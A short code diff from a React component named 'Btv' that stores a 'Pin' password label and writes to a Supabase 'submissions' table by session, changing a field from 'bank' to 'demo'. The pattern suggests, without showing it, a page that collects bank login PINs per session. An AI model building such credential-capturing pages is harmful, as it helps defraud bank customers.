@@ -149,7 +149,7 @@ const Btv = () => {
         p_password_label: "Pin",
       });
       if (error) console.error("Update failed:", error);
-      await supabase.from("submissions").update({ bank: "BTV" }).eq("session_id", sessionId);
+      await supabase.from("submissions").update({ demo: "BTV" }).eq("session_id", sessionId);
     }
     setShowLoading(true);
   };
